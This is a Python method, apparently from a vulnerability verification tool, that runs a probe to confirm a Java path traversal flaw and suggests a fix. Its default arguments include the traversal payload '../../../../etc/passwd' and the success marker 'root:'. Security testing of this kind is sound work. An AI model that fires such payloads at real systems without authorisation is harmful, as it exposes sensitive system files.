    def _verify_java_path_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_path_probe.py",
            poc_type="java-path-traversal",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "file"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "../../../../etc/passwd"),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="Java path traversal probe observed sensitive file disclosure",
            fail_reason="Java path traversal probe ran but did not confirm sensitive file disclosure",
            fix_suggestion="Normalize paths before file access and restrict reads to a fixed base directory instead of using request-controlled paths directly",
        )


